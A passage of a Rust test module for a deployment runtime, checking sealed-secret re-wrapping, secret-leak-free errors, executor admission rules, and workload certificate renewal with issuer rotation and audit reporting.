            case.config.admit_executor(&host, false, false).unwrap_err()
        );
        assert!(refused.contains("only as a host step"), "{refused}");
        let refused = format!(
            "{:#}",
            case.config
                .admit_executor(&manifest, false, true)
                .unwrap_err()
        );
        assert!(refused.contains("not a host release"), "{refused}");

        // Only Helm writes sealed values (ADR 0048 §4).
        case.config.admit_executor(&manifest, true, false).unwrap();
        let shell = manifest::parse_raw(
            "[product]\nname = \"api\"\nversion = \"1.0.0\"\n\n[deploy]\ninstall = \"true\"\ninputs = [\"app\"]\n",
        )
        .unwrap();
        let refused = format!(
            "{:#}",
            case.config.admit_executor(&shell, true, false).unwrap_err()
        );
        assert!(refused.contains("only the helm executor"), "{refused}");
    }

    /// `case` with one sealed value, sealed for `instance` to a runtime key
    /// in the case's sealing directory.
    fn sealed_case(instance: &str, value: &[u8]) -> Case {
        let mut case = case("");
        let dir = case.root.join("sealing");
        let key = crate::sealing_key::SealingKey::open_or_generate(&dir).unwrap();
        case.config.sealing_dir = Some(dir);
        let target = SealedTarget::new(
            ENVIRONMENT,
            instance,
            SecretRef::new("db", "password").unwrap(),
        )
        .unwrap();
        let sealed = crate::sealed_secret::seal(&target, value, &[key.public().clone()]).unwrap();
        case.step.sealed = vec![SealedStep {
            secret: "db".into(),
            key: "password".into(),
            digest: crate::sealed_secret::digest(&target, &sealed).unwrap(),
        }];
        case.release.sealed = vec![RuntimeSealedValue {
            secret: "db".into(),
            key: "password".into(),
            sealed,
        }];
        case
    }

    /// A re-wrap step (ADR 0045 §5) wraps exactly the approved values for
    /// exactly the approved key: the new key then opens them, the digest is
    /// unchanged, and a substituted key or value is refused. No value
    /// reaches an error.
    #[test]
    fn a_rewrap_wraps_only_the_approved_values_for_the_approved_key() {
        let case = sealed_case("api", b"hunter2");
        let newcomer_dir = case.root.join("newcomer");
        let newcomer = crate::sealing_key::SealingKey::open_or_generate(&newcomer_dir).unwrap();
        let rewrap = RewrapStep {
            fingerprint: newcomer.fingerprint(),
            recovered: Vec::new(),
        };
        let mut release = case.release.clone();
        release.rewrap_recipient = Some(newcomer.to_wire());

        let wraps = case
            .config
            .rewrap_sealed(&release, ENVIRONMENT, &case.step, &rewrap)
            .unwrap();
        let [wrap] = wraps.as_slice() else {
            panic!("one wrap per value");
        };
        assert_eq!(wrap.wrap.fingerprint, newcomer.fingerprint());
        assert_eq!(wrap.digest, case.step.sealed[0].digest);
        let target = SealedTarget::new(
            ENVIRONMENT,
            "api",
            SecretRef::new("db", "password").unwrap(),
        )
        .unwrap();
        let mut sealed = release.sealed[0].sealed.clone();
        sealed.wraps.push(wrap.wrap.clone());
        assert_eq!(
            crate::sealed_secret::digest(&target, &sealed).unwrap(),
            case.step.sealed[0].digest
        );
        let opened = SealedOpener::load(&newcomer_dir)
            .unwrap()
            .open(&target, &sealed)
            .unwrap();
        assert_eq!(opened.as_slice(), b"hunter2");

        let refusal = |release: &RuntimeRelease| {
            let error = format!(
                "{:#}",
                case.config
                    .rewrap_sealed(release, ENVIRONMENT, &case.step, &rewrap)
                    .unwrap_err()
            );
            assert!(!error.contains("hunter2"), "{error}");
            error
        };
        // A key other than the one the approved step names.
        let mut substituted = release.clone();
        let stranger =
            crate::sealing_key::SealingKey::open_or_generate(&case.root.join("stranger")).unwrap();
        substituted.rewrap_recipient = Some(stranger.to_wire());
        assert!(refusal(&substituted).contains("other than the approved"));
        // A value the server swapped in.
        let mut swapped = release.clone();
        swapped.sealed = sealed_case("api", b"forged").release.sealed.clone();
        assert!(refusal(&swapped).contains("does not match"));
        // No recipient key at all.
        let mut keyless = release.clone();
        keyless.rewrap_recipient = None;
        assert!(refusal(&keyless).contains("no recipient key"));
        // A value at the wrap limit: one more wrap would open it for no one.
        let mut full = release.clone();
        let filler = full.sealed[0].sealed.wraps[0].clone();
        full.sealed[0].sealed.wraps = (0..crate::sealed_secret::MAX_WRAPS)
            .map(|n| crate::sealed_secret::SealedWrap {
                fingerprint: format!("sha256:{n:064x}"),
                ..filler.clone()
            })
            .collect();
        full.sealed[0].sealed.wraps[0] = filler;
        assert!(refusal(&full).contains("already has"));
    }

    /// A runtime that lost its wrap re-wraps for itself only through the
    /// recovered wrap the approved step carries (ADR 0045 §7): without it,
    /// or with one for another value, the step fails and wraps nothing.
    #[test]
    fn a_runtime_recovers_a_value_only_through_the_approved_recovered_wrap() {
        let mut case = sealed_case("api", b"hunter2");
        let runtime_dir = case.config.sealing_dir.clone().unwrap();
        let runtime = crate::sealing_key::SealingKey::open_or_generate(&runtime_dir).unwrap();
        let recovery_path = case.root.join("recovery.pem");
        let recovery_key = crate::sealing_key::generate_recovery_key(&recovery_path).unwrap();
        let recovery = SealedOpener::from_pem_file(&recovery_path).unwrap();
        let target = SealedTarget::new(
            ENVIRONMENT,
            "api",
            SecretRef::new("db", "password").unwrap(),
        )
        .unwrap();
        // Sealed before this runtime existed: only the recovery key opens it.
        let sealed =
            crate::sealed_secret::seal(&target, b"hunter2", std::slice::from_ref(&recovery_key))
                .unwrap();
        let digest = crate::sealed_secret::digest(&target, &sealed).unwrap();
        case.step.sealed[0].digest = digest.clone();
        case.release.sealed[0].sealed = sealed.clone();
        case.release.rewrap_recipient = Some(runtime.to_wire());
        let recovered =
            |sealed: &crate::sealed_secret::SealedValue| crate::sealed_secret::RecipientWrap {
                secret: "db".into(),
                key: "password".into(),
                digest: digest.clone(),
                wrap: recovery.rewrap(&target, sealed, runtime.public()).unwrap(),
            };
        let step = |recovered: Vec<_>| RewrapStep {
            fingerprint: runtime.fingerprint(),
            recovered,
        };
        let run = |rewrap: &RewrapStep| {
            case.config
                .rewrap_sealed(&case.release, ENVIRONMENT, &case.step, rewrap)
        };

        let error = format!("{:#}", run(&step(Vec::new())).unwrap_err());
        assert!(error.contains("has no wrap"), "{error}");
        let other = crate::sealed_secret::seal(&target, b"forged", &[recovery_key]).unwrap();
        let error = format!("{:#}", run(&step(vec![recovered(&other)])).unwrap_err());
        assert!(
            !error.contains("hunter2") && !error.contains("forged"),
            "{error}"
        );

        let wraps = run(&step(vec![recovered(&sealed)])).unwrap();
        let [wrap] = wraps.as_slice() else {
            panic!("one wrap per value");
        };
        assert_eq!(wrap.digest, digest);
        let mut stored = sealed;
        stored.wraps.push(wrap.wrap.clone());
        let opened = SealedOpener::load(&runtime_dir)
            .unwrap()
            .open(&target, &stored)
            .unwrap();
        assert_eq!(opened.as_slice(), b"hunter2");
    }

    #[test]
    fn a_sealed_value_opens_only_as_the_approved_step_names_it() {
        let case = sealed_case("api", b"hunter2");
        let verified = case
            .config
            .verify(
                case.release.clone(),
                ENVIRONMENT,
                &Expected::target(&case.step),
            )
            .unwrap();
        let [opened] = verified.request.opened_secrets.as_slice() else {
            panic!("one opened value");
        };
        assert_eq!(
            (opened.secret.as_str(), opened.key.as_str()),
            ("db", "password")
        );
        assert_eq!(opened.value.as_slice(), b"hunter2");
        assert!(!format!("{verified:?}").contains("hunter2"));
        assert!(
            !serde_json::to_string(&verified.request)
                .unwrap()
                .contains("hunter2")
        );

        // A value the server swapped in, even one sealed to this runtime,
        // is not what the approved plan names.
        let mut swapped = case.release.clone();
        swapped.sealed = sealed_case("api", b"forged").release.sealed.clone();
        let refused = refusal(&case, swapped);
        assert!(refused.contains("does not match"), "{refused}");
        assert!(!refused.contains("forged"), "{refused}");

        // A value sealed for another instance does not open for this one,
        // even when the step names its digest.
        let other = sealed_case("worker", b"hunter2");
        let refused = refusal(&other, other.release.clone());
        assert!(refused.contains("does not match"), "{refused}");

        // Missing or extra values are refused.
        let mut missing = case.release.clone();
        missing.sealed.clear();
        assert!(refusal(&case, missing).contains("do not match the plan step"));

        // A runtime without a sealing key refuses to write any.
        let mut keyless = sealed_case("api", b"hunter2");
        keyless.config.sealing_dir = None;
        let refused = refusal(&keyless, keyless.release.clone());
        assert!(refused.contains("no sealing key"), "{refused}");
    }

    /// Workload certificates held in memory, read back the way an adapter
    /// reads its target: through the certificate that proves each grant.
    #[derive(Default)]
    struct HeldIdentities(std::sync::Mutex<Vec<crate::workload_identity::IssuedIdentity>>);

    impl crate::software_executor::SoftwareExecutor for HeldIdentities {
        fn apply(&self, _: &crate::software_executor::SoftwareApplyRequest) -> Result<()> {
            unreachable!("renewal applies nothing")
        }
        fn remove(&self, _: &crate::software_executor::SoftwareApplyRequest) -> Result<()> {
            unreachable!("renewal removes nothing")
        }
        fn observe(
            &self,
            _: &crate::software_executor::SoftwareApplyRequest,
        ) -> Result<crate::software_executor::SoftwareObserveStatus> {
            unreachable!("renewal observes nothing")
        }
        fn installed_identities(
            &self,
            target: &crate::software_executor::IdentityTarget<'_>,
        ) -> Result<Vec<(String, Result<crate::workload_identity::InstalledIdentity>)>> {
            Ok(self
                .0
                .lock()
                .unwrap()
                .iter()
                .map(|issued| {
                    let read = crate::workload_identity::InstalledIdentity::read(
                        target.environment,
                        "api",
                        &issued.certificate,
                        &issued.ca,
                        &serde_json::to_vec(&issued.grant).unwrap(),
                    );
                    ("api".to_owned(), read)
                })
                .collect())
        }
        fn renew_identity(
            &self,
            _: &crate::software_executor::IdentityTarget<'_>,
            installed: &crate::workload_identity::InstalledIdentity,
            issued: &crate::workload_identity::IssuedIdentity,
        ) -> Result<()> {
            let mut held = self.0.lock().unwrap();
            assert_eq!(held[0].certificate, installed.certificate);
            *held = vec![issued.clone()];
            Ok(())
        }
    }

    /// Renewal re-issues the recorded grant from the issuer the runtime
    /// verified at apply, once two thirds of the lifetime have passed, and
    /// only once: a pass after a restart finds the fresh certificate.
    #[test]
    fn the_runtime_renews_a_due_certificate_once_without_a_step() {
        let mut case = identity_case_reloading("runtime");
        let verified = case
            .config
            .verify(
                case.release.clone(),
                ENVIRONMENT,
                &Expected::target(&case.step),
            )
            .unwrap();
        let first = verified.request.identity.unwrap();
        let held = std::sync::Arc::new(HeldIdentities::default());
        held.0.lock().unwrap().push(first.clone());
        case.config.executors = SoftwareExecutors::with_default(held.clone());
        let now = crate::now_millis() / 1000;

        assert!(
            renew_identities(&case.config, ENVIRONMENT, now + 3600)
                .unwrap()
                .renewals
                .is_empty()
        );
        let due = now + 17 * 3600;
        let renewed = renew_identities(&case.config, ENVIRONMENT, due)
            .unwrap()
            .renewals;
        assert_eq!(renewed.len(), 1);
        assert_eq!(renewed[0].instance, "api");
        renewed[0].outcome.as_ref().unwrap();
        let second = held.0.lock().unwrap()[0].clone();
        assert_eq!(second.grant, first.grant);
        assert_ne!(second.certificate, first.certificate);
        assert_ne!(*second.key, *first.key);
        crate::workload_identity::check_issued(&second, due).unwrap();
        assert!(
            renew_identities(&case.config, ENVIRONMENT, due)
                .unwrap()
                .renewals
                .is_empty()
        );

        // A restarted runtime that never verified this issuer refuses, by name.
        std::fs::remove_file(
            case.config
                .sealing_dir
                .as_ref()
                .unwrap()
                .join(format!("identity-issuer-{ENVIRONMENT}.json")),
        )
        .unwrap();
        let later = due + 17 * 3600;
        let refused = renew_identities(&case.config, ENVIRONMENT, later)
            .unwrap()
            .renewals;
        let error = refused[0].outcome.as_ref().unwrap_err();
        assert!(error.contains("verified no identity issuer"), "{error}");
    }

    /// Each pass audits its attempts on the runtime and reports every
    /// certificate with the last one: a renewal, then a failure that
    /// repeats every pass audited once and shown near expiry.
    #[test]
    fn renewal_is_audited_on_the_runtime_and_reported() {
        let mut case = identity_case_reloading("runtime");
        let verified = case
            .config
            .verify(
                case.release.clone(),
                ENVIRONMENT,
                &Expected::target(&case.step),
            )
            .unwrap();
        let held = std::sync::Arc::new(HeldIdentities::default());
        held.0
            .lock()
            .unwrap()
            .push(verified.request.identity.unwrap());
        case.config.executors = SoftwareExecutors::with_default(held.clone());
        let dir = case.config.sealing_dir.clone().unwrap();
        let due = crate::now_millis() / 1000 + 17 * 3600;

        let [report] = renew_and_audit(&case.config, ENVIRONMENT, due)
            .unwrap()
            .try_into()
            .unwrap();
        let renewed_until = match &report.last_renewal.as_ref().unwrap().outcome {
            crate::certificate_reports::RenewalOutcome::Renewed { not_after } => *not_after,
            other => panic!("renewed: {other:?}"),
        };
        // The next pass reports the certificate it wrote.
        let [report] = renew_and_audit(&case.config, ENVIRONMENT, due + 60)
            .unwrap()
            .try_into()
            .unwrap();
        assert!(report.not_after >= renewed_until - 60);
        assert!(!report.status(due + 60).near_expiry);

        // Without the issuer, renewal fails every pass; the audit keeps one
        // entry, and the report names the failure once near expiry.
        std::fs::remove_file(dir.join(format!("identity-issuer-{ENVIRONMENT}.json"))).unwrap();
        let late = report.not_after - 3 * 3600;
        renew_and_audit(&case.config, ENVIRONMENT, late).unwrap();
        let [report] = renew_and_audit(&case.config, ENVIRONMENT, late + 60)
            .unwrap()
            .try_into()
            .unwrap();
        assert_eq!(
            crate::renewal_audit::entries(&dir, ENVIRONMENT)
                .unwrap()
                .len(),
            2
        );
        let status = report.status(late + 60);
        assert!(status.near_expiry);
        assert_eq!(status.expires_at, report.not_after);
        let failure = status.renewal_failure.unwrap();
        assert!(failure.contains("verified no identity issuer"), "{failure}");
    }

    /// An approved add step puts the next issuer in every bundle: the next
    /// renewal pass re-issues a restart-reload certificate at once, with
    /// the issuing issuer first and the next one after it, and only once.
    #[test]
    fn an_added_issuer_reaches_every_bundle_on_the_next_pass() {
        let mut case = identity_case();
        let verified = case
            .config
            .verify(
                case.release.clone(),
                ENVIRONMENT,
                &Expected::target(&case.step),
            )
            .unwrap();
        let issued = verified.request.identity.unwrap();
        let held = std::sync::Arc::new(HeldIdentities::default());
        held.0.lock().unwrap().push(issued.clone());
        case.config.executors = SoftwareExecutors::with_default(held.clone());
        let now = crate::now_millis() / 1000;
        assert!(
            renew_identities(&case.config, ENVIRONMENT, now)
                .unwrap()
                .renewals
                .is_empty()
        );

        let dir = case.config.sealing_dir.clone().unwrap();
        let public = crate::sealing_key::SealingKey::open_or_generate(&dir)
            .unwrap()
            .public()
            .clone();
        let next = crate::identity_issuer::generate(ENVIRONMENT, 2, &public, now).unwrap();
        let add = IssuerStep {
            key: next.clone(),
            recipient: None,
            phase: Some(crate::identity_issuer::RotationPhase::Add),
        };
        case.config.run_issuer(ENVIRONMENT, &add, None).unwrap();

        let renewed = renew_identities(&case.config, ENVIRONMENT, now)
            .unwrap()
            .renewals;
        renewed[0].outcome.as_ref().unwrap();
        let bundled = held.0.lock().unwrap()[0].clone();
        assert_eq!(bundled.grant, issued.grant);
        let installed = crate::workload_identity::InstalledIdentity::read(
            ENVIRONMENT,
            "api",
            &bundled.certificate,
            &bundled.ca,
            &serde_json::to_vec(&bundled.grant).unwrap(),
        )
        .unwrap();
        assert_eq!(
            installed.trust,
            [issued.grant.issuer_fingerprint.clone(), next.fingerprint]
        );
        assert!(
            renew_identities(&case.config, ENVIRONMENT, now)
                .unwrap()
                .renewals
                .is_empty()
        );
    }

    /// A restart-reload certificate falls due later by its environment's
    /// fixed delay, then renews through the adapter, which restarts it.
    #[test]
    fn a_restart_reload_certificate_renews_after_its_environment_delay() {
        let mut case = identity_case();
        let verified = case
            .config
            .verify(
                case.release.clone(),
                ENVIRONMENT,
                &Expected::target(&case.step),
            )
            .unwrap();
        let issued = verified.request.identity.unwrap();
        let held = std::sync::Arc::new(HeldIdentities::default());
        held.0.lock().unwrap().push(issued.clone());
        case.config.executors = SoftwareExecutors::with_default(held.clone());
        let installed = crate::workload_identity::InstalledIdentity::read(
            ENVIRONMENT,
            "api",
            &issued.certificate,
            &issued.ca,
            &serde_json::to_vec(&issued.grant).unwrap(),
        )
        .unwrap();
        let lifetime = installed.not_after - installed.not_before;
        let delay = restart_delay(ENVIRONMENT, lifetime);
        assert!((0..lifetime / 12).contains(&delay));
        assert_ne!(delay, restart_delay("staging", lifetime));
        let due = installed.not_before + lifetime / 3 * 2 + delay;

        assert!(
            renew_identities(&case.config, ENVIRONMENT, due - 1)
                .unwrap()
                .renewals
                .is_empty()
        );
        let renewed = renew_identities(&case.config, ENVIRONMENT, due)
            .unwrap()
            .renewals;
        renewed[0].outcome.as_ref().unwrap();
        assert_ne!(held.0.lock().unwrap()[0].certificate, issued.certificate);
    }
}
